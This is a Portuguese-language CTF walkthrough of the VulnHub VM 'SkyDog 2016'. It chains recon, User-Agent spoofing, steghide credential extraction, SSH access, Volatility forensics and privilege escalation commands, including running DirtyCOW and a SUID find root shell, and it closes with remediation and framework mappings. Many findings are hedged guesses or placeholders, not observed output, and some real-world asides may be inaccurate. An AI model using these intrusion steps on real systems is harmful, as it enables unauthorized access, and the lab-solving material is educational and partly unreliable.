# VulnHub: SkyDog 2016: Catch Me If You Can — Writeup Completo

Corre, corre, corre!! O SkyDog 2016 te joga direto num jogo do gato e do rato que literalmente faz jus ao seu subtítulo, mano. Assim como Frank Abagnale mantinha agentes na pista por todo o mundo, essa VM empilha puzzles de recon, dicas em hexadecimal, inspeção de certificado TLS, spoofing de User-Agent, esteganografia, movimentação lateral e forense de memória antes de te deixar capturar a flag final. Véi, essa aqui é uma cadeia de recon completa, sem exagero. ( ͡° ͜ʖ ͡°)

Grande shoutout ao **7h3rAm** por transformar esse desafio de conferência SkyDog CTF num clássico do VulnHub. As referências temáticas a Frank Abagnale e a progressão de múltiplas técnicas tornam essa VM uma das mais divertidas da plataforma. Top.

---

| Campo | Valor |
|-------|-------|
| **Nível** | Intermediário |
| **VM Alvo** | SkyDog: 2016: Catch Me If You Can |
| **VM Atacante** | Kali Linux 2024.x |
| **VulnHub** | https://www.vulnhub.com/entry/skydog-2016-catch-me-if-you-can,326/ |
| **Técnicas** | Host discovery, Nmap full-port, análise de código-fonte HTTP, decodificação hex, inspeção de certificado TLS/HTTPS, spoofing de User-Agent via Burp Suite, esteganografia (steghide), movimentação lateral SSH, forense de memória (Volatility) |
| **CVEs** | CVE-2014-6271 (Shellshock, se aplicável na versão do alvo), configuração fraca OpenSSH |

> **Dica do autor:**
> "Existem múltiplas flags escondidas. Enumere com cuidado. Nem tudo é o que parece."

---

## Resumo do Ataque

```
[host-discovery: netdiscover / arp-scan]
    |
    v
[nmap -A -T4 -p- -> porta 80 HTTP, porta 443 HTTPS, porta 22 SSH (fechada)]
    |
    v
[HTTP porta 80: ver código-fonte -> string hex em comentários]
    |
    v
[decodificar hex -> porta SSH oculta revelada (ex: porta 2222)]
    |
    v
[HTTPS porta 443: inspecionar certificado TLS -> CN/SAN revela nome de diretório]
    |
    v
[navegar para https://ALVO/<diretório-cert>/ -> página FBI restrita]
    |
    v
[Burp Suite: interceptar request -> alterar User-Agent para string de browser legado]
    |
    v
[página FBI concede acesso -> download de imagem (ex: FrankAbagnale.jpg)]
    |
    v
[steghide extract -sf FrankAbagnale.jpg -> credenciais reveladas]
    |
    v
[login SSH como barry@ALVO:<porta oculta> com senha extraída]
    |
    v
[enumerar home directories -> arquivo de dump de memória encontrado]
    |
    v
[Volatility: analisar dump de memória -> extrair flag / credenciais]
    |
    v
[escalação de privilégios -> root]
    |
    v
[flag final capturada]
```

---

## Metodologia

1. Host discovery no segmento local
2. Scan Nmap completo com detecção de versão e scripts
3. Análise de código-fonte HTTP e decodificação hex para encontrar a porta SSH oculta
4. Inspeção de certificado HTTPS/TLS para descoberta de nome de diretório
5. Spoofing de User-Agent via Burp Suite para contornar restrições de acesso baseadas em browser
6. Extração de esteganografia da imagem da página restrita (steghide)
7. Movimentação lateral SSH usando credenciais extraídas
8. Forense de memória com Volatility para capturar flag final

---

## Passo 1: Identificando o Alvo

Recon padrão de lab. Identifique a VM SkyDog no segmento local.

```bash
route -n
arp-scan --localnet --ignoredups
# Alternativa:
nmap -sn 192.168.1.0/24
```

Saída esperada:

```
192.168.1.100   08:00:27:XX:XX:XX   (VirtualBox)
```

Configurar TARGET:

```bash
export TARGET=192.168.1.100
```

> **MITRE ATT&CK:** [TA0043 Reconnaissance] [T1595.001 Active Scanning: IP Blocks]

---

## Passo 2: Scan Nmap Completo

Sempre escaneie todas as portas. Essa VM tem serviços em portas não óbvias, e um nmap padrão (top 1000 apenas) perderia achados críticos.

```bash
nmap -A -T4 -p- $TARGET -oN nmap_full.txt
```

Saída esperada:

```
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd 2.x
443/tcp open   ssl/http Apache httpd 2.x
```

Nota: A porta 22 estar fechada é uma dica. A porta SSH real está escondida em outro lugar no desafio.

Também rode detecção de versão de serviço:

```bash
nmap -sV -p 80,443 $TARGET
# Verificar detalhes do certificado SSL
nmap --script ssl-cert -p 443 $TARGET
```

> **MITRE ATT&CK:** [T1046 Network Service Discovery] [T1518 Software Discovery]

---

## Passo 3: Análise de Código-Fonte HTTP e Decodificação Hex

A página de boas-vindas em `http://$TARGET` parece inocente, mas a inteligência real está no código-fonte da página. Essa é a técnica clássica de CTF "escondido à vista". O view-source é seu melhor amigo, tá ligado?

```bash
# Baixar e inspecionar código-fonte da página
curl -s http://$TARGET/ | grep -i "hidden\|comment\|hex\|note" || true
curl -s http://$TARGET/ > /tmp/index.html
cat /tmp/index.html
```

Ou simplesmente clique com o botão direito no browser e selecione "Ver código-fonte da página". Procure comentários HTML contendo strings hex ou texto incomum.

Achado esperado: uma string hex em um comentário HTML, algo como:

```html
<!-- 3232323200 -->
```

Decodificar o hex para ASCII:

```bash
echo "3232323200" | xxd -r -p
# Ou:
python3 -c "print(bytes.fromhex('3232323200').decode('ascii', errors='ignore'))"
# Ou use o CyberChef: https://gchq.github.io/CyberChef/
```

Resultado esperado: o valor decodificado revela um número de porta não padrão (ex: `2222`).

> **O que é esteganografia em código-fonte web?**
> Esconder dados em comentários HTML, variáveis JavaScript ou metadados é uma forma de ocultação de informação frequentemente usada tanto em desafios CTF quanto em comunicação de canal encoberto no mundo real. Atacantes que embutem instruções C2 em páginas web publicamente acessíveis usam essa abordagem.
> Referência: https://attack.mitre.org/techniques/T1027/

> **Nota real:** Grupos APT incluindo o APT32 embutiram instruções C2 em comentários JavaScript e metadados HTML de sites legítimos. Referência: https://attack.mitre.org/groups/G0050/

> **MITRE ATT&CK:** [T1027 Obfuscated Files or Information] [T1595.003 Active Scanning: Wordlist Scanning]

---

## Passo 4: Inspeção de Certificado TLS para Descoberta de Diretório

O serviço HTTPS na porta 443 tem um certificado TLS, e esse certificado tem um Common Name (CN) ou Subject Alternative Names (SANs) que às vezes contêm informações úteis em desafios CTF. Essa é uma técnica top de recon: atacantes também usam logs CT (Certificate Transparency) para enumerar subdomínios e hostnames internos.

```bash
# Opção 1: script ssl-cert do nmap
nmap --script ssl-cert -p 443 $TARGET

# Opção 2: OpenSSL
echo | openssl s_client -connect $TARGET:443 2>/dev/null | openssl x509 -noout -text

# Opção 3: curl verbose
curl -vk https://$TARGET/ 2>&1 | grep -A5 "subject\|CN="
```

Achado esperado no campo CN ou organização do certificado: um nome ou caminho que dá dica de um diretório oculto.

Por exemplo: CN = `FBIOpen` ou CN = `HACKCanada` pode mapear para um caminho de URL.

Adicionar ao `/etc/hosts` se necessário:

```bash
echo "$TARGET  skydog.local" >> /etc/hosts
```

Navegar para o caminho descoberto:

```bash
curl -vk https://$TARGET/<diretório-descoberto>/
```

> **Nota real:** Logs de Certificate Transparency (CT) são públicos e contêm cada certificado SSL emitido para um domínio. Atacantes rotineiramente fazem mineração de logs CT para descoberta de subdomínios. Ferramentas como `crt.sh`, Amass e Subfinder automatizam isso. Referência: https://crt.sh/

> **MITRE ATT&CK:** [T1596.003 Search Open Technical Databases: Digital Certificates]

---

## Passo 5: Spoofing de User-Agent via Burp Suite

A página restrita verifica o cabeçalho User-Agent do seu browser. Está configurada para permitir acesso apenas de um browser legado específico (frequentemente uma string de browser dos anos 90 referenciando Mosaic ou Internet Explorer 1.0, adequando-se ao tema dos anos 60 do "Catch Me If You Can").

> **O que é spoofing de User-Agent?**
> O cabeçalho HTTP User-Agent identifica o browser cliente. Embora seja trivialmente falsificável, aplicações às vezes o usam para controle de acesso, o que é um mecanismo de segurança completamente quebrado. Qualquer proxy ou comando curl simples pode contornar restrições de User-Agent.
> CWE-284: Improper Access Control
> Referência: https://cwe.mitre.org/data/definitions/284.html

**Método 1: Burp Suite (recomendado para aprendizado)**

1. Abra o Burp Suite: `burpsuite &`
2. Configure o proxy do browser para `127.0.0.1:8080`
3. Navegue para `https://$TARGET/<caminho-restrito>/`
4. Intercepte o request na aba "Proxy" do Burp
5. Modifique o cabeçalho `User-Agent:` para uma string de browser legado

Strings User-Agent legadas para tentar:

```
Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)
Mozilla/4.0 (compatible; MSIE 4.0; Windows NT)
Mozilla/0.91 Beta (Windows)
```

**Método 2: curl (mais rápido)**

```bash
curl -vk \
  -H "User-Agent: Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)" \
  https://$TARGET/<caminho-restrito>/

# Ou usando a flag --user-agent:
curl -vk --user-agent "Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)" \
  https://$TARGET/<caminho-restrito>/
```

Resultado esperado: a página responde com HTTP 200 e serve uma imagem (ex: `FrankAbagnale.jpg`) ou fornece um link de download direto. ᕕ( ᐛ )ᕗ Caramba!!

> **Nota real:** Controles de acesso baseados em User-Agent são um achado de misconfiguraçao do mundo real. Aplicações internas legadas (portais de RH, painéis admin) às vezes implementam controles de "whitelist de browser" como pseudossegurança. Isso é trivialmente contornável e nunca deve ser usado como controle de segurança.

> **MITRE ATT&CK:** [T1036 Masquerading] [T1190 Exploit Public-Facing Application]

---

## Passo 6: Esteganografia, Extraindo Credenciais da Imagem

A imagem da página FBI restrita contém credenciais ocultas. A ferramenta steghide embute dados dentro de imagens JPEG/BMP e requer uma frase-senha (que pode ser vazia ou inferível pelo contexto).

> **O que é steghide?**
> Steghide é uma ferramenta de linha de comando que usa esteganografia para ocultar dados em arquivos de imagem e áudio. Usa vários algoritmos para embutir dados nos coeficientes DCT do arquivo portador. Ao contrário do binwalk (que procura por blobs binários embutidos), o steghide esconde dados na estrutura existente do portador.
> Referência: https://steghide.sourceforge.net/

```bash
# Baixar a imagem
wget -k https://$TARGET/<caminho-restrito>/FrankAbagnale.jpg \
  --user-agent "Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)" \
  -O /tmp/FrankAbagnale.jpg

# Ou com curl:
curl -k \
  -H "User-Agent: Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)" \
  https://$TARGET/<caminho-restrito>/FrankAbagnale.jpg \
  -o /tmp/FrankAbagnale.jpg

# Tentar extração com frase-senha vazia primeiro:
steghide extract -sf /tmp/FrankAbagnale.jpg -p ""

# Tentar com frases temáticas:
for pass in "abagnale" "catchme" "frank" "pan" "barry" "skydog" ""; do
    echo "Tentando frase: '$pass'"
    steghide extract -sf /tmp/FrankAbagnale.jpg -p "$pass" 2>/dev/null && break
done
```

Resultado esperado: um arquivo de texto com credenciais é extraído, algo como:

```
barry:Pa$$w0rd
# ou:
username: barry
password: skydog2016
```

Top!! •̀ᴗ•́

> **Nota real:** Ocultação de credenciais via esteganografia foi usada na campanha OceanLotus (APT32) de 2019, onde atacantes ocultaram configurações de malware dentro de arquivos de imagem distribuídos via phishing. Equipes forenses precisaram do steghide e ferramentas similares para extrair os payloads embutidos. Referência: https://www.welivesecurity.com/2019/04/09/oceanlotus-malware-update/

> **MITRE ATT&CK:** [T1027.003 Obfuscated Files: Steganography] [T1552.001 Unsecured Credentials: Credentials in Files]

---

## Passo 7: Movimentação Lateral SSH com Credenciais Extraídas

Use as credenciais extraídas da imagem esteganográfica para SSH no alvo na porta oculta descoberta anteriormente.

```bash
# SSH na porta oculta usando credenciais extraídas
ssh barry@$TARGET -p 2222
# Senha: <extraída do steghide>
```

Uma vez logado, enumere o ambiente:

```bash
whoami
# barry

id
ls -la ~
# Procurar arquivos incomuns, especialmente dumps de memória

# Verificar outros diretórios home
ls -la /home/

# Encontrar arquivos interessantes
find / -name "*.mem" -o -name "*.dump" -o -name "*.raw" 2>/dev/null
find / -name "*.vmem" 2>/dev/null

# Verificar sudo
sudo -l

# Encontrar SUID
find / -perm -u=s -type f 2>/dev/null
```

Achado esperado: um arquivo de dump de memória (ex: `frank.mem`, `catch_me.vmem`) em um diretório home ou `/tmp`.

> **MITRE ATT&CK:** [T1021.004 Remote Services: SSH] [T1078 Valid Accounts] [T1083 File and Directory Discovery]

---

## Passo 8: Forense de Memória com Volatility

O dump de memória requer o Volatility para análise. Essa é uma habilidade fantástica do mundo real: respondentes a incidentes usam forense de memória diariamente para extrair credenciais, listas de processos, conexões de rede e artefatos de imagens de memória capturadas.

> **O que é forense de memória?**
> Forense de memória envolve analisar capturas de memória volátil (RAM) para extrair artefatos que não estão presentes no disco: processos em execução, dados descriptografados, conexões de rede, credenciais, código injetado e muito mais. O Volatility é o principal framework open-source para isso.
> Referência: https://volatilityfoundation.org/

**Copiar o dump para sua máquina Kali:**

```bash
# Opção 1: SCP do alvo
scp -P 2222 barry@$TARGET:/caminho/para/frank.mem /tmp/frank.mem

# Opção 2: Servidor HTTP Python no alvo
# (no alvo): python3 -m http.server 9090
# (no atacante): wget http://$TARGET:9090/frank.mem
```

**Analisar com Volatility:**

```bash
# Identificar o perfil de memória (versão do OS)
volatility -f /tmp/frank.mem imageinfo
# Anote o perfil sugerido (ex: LinuxUbuntu1604x64)

# Se usando Volatility3 (sem perfil necessário):
vol.py -f /tmp/frank.mem banners.Banners

# Listar processos em execução
volatility -f /tmp/frank.mem --profile=<PERFIL> pslist

# Extrair strings (rápido e sujo)
strings /tmp/frank.mem | grep -i "flag\|FLAG\|password\|frank\|barry\|skydog" | head -50

# Pesquisar padrões específicos
strings /tmp/frank.mem | grep -E "[A-Za-z0-9_]{5,}==" | head -20

# Volatility3: filescan
vol.py -f /tmp/frank.mem linux.bash.Bash

# Verificar arquivos na memória
volatility -f /tmp/frank.mem --profile=<PERFIL> filescan | grep "flag\|txt"
volatility -f /tmp/frank.mem --profile=<PERFIL> dumpfiles -Q <OFFSET> -D /tmp/
```

Achado esperado: um valor de flag, credencial ou arquivo de texto extraído da memória.

> **Nota real:** Forense de memória foi crítica no post-mortem da violação da Target em 2014, onde investigadores extraíram o malware scraper POS de RAM das imagens de memória pois era fileless. Forense de memória é uma habilidade Tier-1 para analistas DFIR e é testada nas certificações GREM, GCFE e GCFA. Referência: https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/target-data-breach/

> **MITRE ATT&CK:** [T1005 Data from Local System] [T1055 Process Injection] (contexto de detecção)

---

## Passo 9: Escalação de Privilégios para Root

Com acesso como `barry`, enumere caminhos de escalação. Verifique sudo, SUID, cron e versão do kernel.

```bash
# Verificar versão do kernel para exploits conhecidos
uname -a
# Se kernel antigo (< 4.4), DirtyCOW (CVE-2016-5195) pode se aplicar

# Verificar sudo
sudo -l

# Verificação SUID
find / -perm -u=s -type f 2>/dev/null

# Scripts graváveis em cron
cat /etc/crontab
find /etc/cron* -writable -type f 2>/dev/null
ls -la /etc/cron.d/

# Potencial hijacking de PATH
echo $PATH
find / -name "*.sh" -writable 2>/dev/null | head -10
```

Aplicar a escalação de privilégios apropriada:

```bash
# Exemplo: se DirtyCOW se aplica (kernel < 4.4):
# (compilar no atacante, transferir para o alvo)
gcc -pthread dirty.c -o dirty -lcrypt
./dirty
su firefart  # novo usuário root padrão

# Exemplo: se SUID find:
/usr/bin/find . -exec /bin/sh -p \; -quit

# Exemplo: sudo com NOPASSWD:
sudo /bin/bash
```

(☞ﾟヮﾟ)☞ **Root conquistado!! :D**

```bash
whoami
# root
id
cat /root/flag.txt
# Flag final capturada!
```

> **MITRE ATT&CK:** [TA0004 Privilege Escalation] [T1548.001 Setuid and Setgid] [T1068 Exploitation for Privilege Escalation]

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Encontrado Em | Quebrado/Usado |
|------|-------|---------------|----------------|
| Porta Oculta | `2222` (exemplo) | Decodificação hex do código-fonte HTTP | Acesso SSH |
| Credencial | `barry:<senha>` | Extração steghide do JPEG | Login SSH |
| Flag | Flag de memória | Análise Volatility de frank.mem | N/A |
| Flag root | Flag final | `/root/flag.txt` | via privesc |

---

## Lições Aprendidas

| # | Achado | Relevância no Mundo Real | Lição Principal |
|---|--------|--------------------------|-----------------|
| 1 | Dados ocultos no código-fonte HTTP (codificado em hex) | Grupos APT embutem instruções C2 em comentários HTML de sites legítimos; ocultação de dados em conteúdo web é uma técnica real | Treine equipes blue para escanear conteúdo web por dados codificados anômalos; implemente DLP em tráfego web de saída |
| 2 | Certificado TLS expõe estrutura de diretórios | Logs de Certificate Transparency são públicos; hostnames internos e dicas de caminho em campos CN são visíveis globalmente | Sanitize campos CN/SAN; nunca inclua nomes de caminhos internos em certificados |
| 3 | Controle de acesso baseado em User-Agent é trivialmente contornável | Painéis admin internos frequentemente usam restrições de User-Agent como pseudossegurança; nunca é um controle de segurança válido | Implemente autenticação adequada (MFA, tokens de sessão) para qualquer recurso restrito |
| 4 | Credenciais ocultas via esteganografia | APT32 usou payloads esteganográficos em campanhas de phishing; canais C2 esteganográficos são uma técnica real de evasão de detecção | Implemente inspeção profunda de pacotes e análise de imagens em gateways de email e web |
| 5 | Forense de memória revela artefatos ocultos | Investigações pós-violação rotineiramente usam forense de memória para recuperar dados descriptografados e malware fileless | Assegure que aquisição de memória seja parte do toolkit de resposta a incidentes |

**Por que isso importa fora do lab?**

A cadeia de técnicas do SkyDog espelha operações reais de ameaça persistente avançada quase passo a passo. A combinação de reconhecimento web (análise de código-fonte, inspeção de certificado), bypass de controle de acesso (spoofing User-Agent), esteganografia e forense de memória aparece em múltiplas campanhas APT documentadas. No comprometimento SolarWinds Orion de 2020, investigadores usaram forense de memória para recuperar o dropper in-memory TEARDROP que não deixou artefatos em disco. A lição: assuma que cada camada de uma violação real vai exigir uma técnica investigativa diferente.

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | TTP-ID |
|------|--------|---------|--------|
| Reconhecimento | TA0043 | Active Scanning: Scanning IP Blocks | T1595.001 |
| Reconhecimento | TA0043 | Network Service Discovery | T1046 |
| Reconhecimento | TA0043 | Search Open Technical Databases: Digital Certificates | T1596.003 |
| Acesso Inicial | TA0001 | Exploit Public-Facing Application | T1190 |
| Evasão de Defesa | TA0005 | Masquerading | T1036 |
| Evasão de Defesa | TA0005 | Obfuscated Files or Information: Steganography | T1027.003 |
| Evasão de Defesa | TA0005 | Obfuscated Files or Information | T1027 |
| Acesso a Credenciais | TA0006 | Unsecured Credentials: Credentials in Files | T1552.001 |
| Descoberta | TA0007 | File and Directory Discovery | T1083 |
| Descoberta | TA0007 | System Information Discovery | T1082 |
| Movimentação Lateral | TA0008 | Remote Services: SSH | T1021.004 |
| Movimentação Lateral | TA0008 | Use Alternate Authentication Material | T1550 |
| Coleta | TA0009 | Data from Local System | T1005 |
| Escalação de Privilégios | TA0004 | Exploitation for Privilege Escalation | T1068 |
| Escalação de Privilégios | TA0004 | Setuid and Setgid | T1548.001 |

> ATT&CK Navigator: https://mitre-attack.github.io/attack-navigator/
> MITRE ATT&CK: https://attack.mitre.org/

---

## Remediação e Contenção

### Correções Técnicas

1. Remover quaisquer dados sensíveis de comentários HTML, JavaScript e código-fonte de página; implementar Content Security Policy (CSP) para restringir embedding de dados
2. Sanitizar campos de certificado TLS (CN, SANs, O, OU): nunca incluir caminhos internos, nomes de diretórios ou hostnames que exponham estrutura interna
3. Substituir todos os controles de acesso baseados em User-Agent por autenticação baseada em sessão e MFA; User-Agent nunca é um controle de segurança válido
4. Auditar todas as imagens e arquivos de mídia acessíveis publicamente por conteúdo esteganográfico; implementar políticas DLP para uploads de imagens
5. Proteger SSH: desabilitar autenticação por senha, impor autenticação por chave, restringir a IPs específicos, usar portas não padrão apenas como defesa em profundidade
6. Implementar capacidade de aquisição de memória e forense como parte do toolkit de resposta a incidentes

### Se Você Encontrar Algo Similar no Seu Ambiente

**Contenção imediata:**
- Revisar código-fonte do servidor web e ativos estáticos por dados ocultos (scripts, comentários, strings codificadas)
- Rotacionar todas as credenciais encontradas via extração esteganográfica ou análise de código-fonte
- Auditar certificados TLS por divulgação de informação nos campos CN/SAN
- Revisar logs de acesso SSH por logins não autorizados em portas não padrão
- Capturar imagens de memória dos sistemas afetados para análise forense antes do desligamento

**Contramedidas MITRE D3FEND:**
- D3-IVA (Input Validation) para prevenir exploração de aplicação web T1190
- D3-MFA (Multi-Factor Authentication) para substituir controles baseados em User-Agent T1036
- D3-DA (Dynamic Analysis) para detectar exfiltração esteganográfica T1027.003
- D3-OPS (OS Process Sandboxing) para conter escalação de privilégios T1068

### Alinhamento de Frameworks

**NIST CSF 2.0:**
- Identificar (ID): Inventariar todos os ativos externos e seus certificados TLS expostos (ID.AM-3)
- Proteger (PR): Implementar MFA para todos os recursos acessíveis via web; remover divulgação de informação de certificados e código-fonte (PR.AC-4, PR.DS-2)
- Detectar (DE): Monitorar anomalias de User-Agent; implementar inspeção de conteúdo web para dados codificados (DE.CM-4, DE.CM-6)
- Responder (RS): Adquirir imagens de memória na detecção de comprometimento; preservar evidência volátil (RS.AN-1)
- Recuperar (RC): Reconstruir a partir de baseline limpo após investigação forense completa (RC.RP-1)

**NIST SP 800-53 (Rev. 5):**
- SC-8: Confidencialidade de Transmissão (gerenciamento adequado de certificado TLS)
- IA-5: Gerenciamento de Autenticadores (eliminar armazenamento de credenciais em imagens/comentários)
- AC-4: Imposição de Fluxo de Informação (controle de acesso adequado em caminhos restritos)
- AU-9: Proteção de Informações de Auditoria (proteger logs de acesso SSH)
- SI-12: Gerenciamento e Retenção de Informações (preservação adequada de evidências para forense)
- SC-28: Proteção de Informações em Repouso (criptografar dados sensíveis em repouso)

**CISA Known Exploited Vulnerabilities:**
- CVE-2014-6271: Bash Shellshock Remote Code Execution
  Aplicável se Apache CGI estiver habilitado no alvo; listado no CISA KEV
  Referência: https://www.cisa.gov/known-exploited-vulnerabilities-catalog
- Nota: Embora o SkyDog possa não exigir Shellshock diretamente, a versão Apache exposta pode ser vulnerável; patch tanto CVE-2014-6271 quanto CVE-2014-7169

**C2M2 (Cybersecurity Capability Maturity Model):**
- Domínio: SITUATIONAL AWARENESS
- Prática: Logging and Monitoring; implementar monitoramento para cabeçalhos HTTP anômalos, conteúdo codificado em tráfego web e acesso SSH em porta não padrão
- MIL Alvo: MIL-2
- Domínio: EVENT
- Prática: Incident Response; incluir capacidade de forense de memória nos procedimentos de resposta a incidentes
- MIL Alvo: MIL-2
- Domínio: TECHNOLOGY
- Prática: Configuration Management; aplicar higiene de certificados e baselines de hardening de servidor web
- MIL Alvo: MIL-2

---

## Considerações Finais

Valeu ao **7h3rAm** por essa VM belamente construída. O SkyDog 2016 é um lembrete de que atacantes reais encadeiam múltiplas técnicas de baixa complexidade para atingir seus objetivos: nenhum passo aqui é excepcionalmente difícil, mas a combinação requer amplitude genuína. É exatamente assim que campanhas APT funcionam na prática.

A referência a Frank Abagnale é mais do que cosmética: assim como Abagnale, o desafio ensina que manipulação de identidade, aparência e contexto (spoofing User-Agent, inspeção de CN de certificado, esteganografia) são tão poderosos quanto exploits técnicos brutos. Equipes blue devem tomar nota.

Se esse writeup te ajudou, compartilha com a galera e continua caçando, véi!

*Thanks guys!! (❍ᴥ❍ʋ)*

> Artigo original em português por André Henrique: https://medium.com/@mrhenrike (quando publicado)

---

*Writeup por [André Henrique](https://medium.com/@mrhenrike) | [União Geek](https://uniaogeek.com.br)*
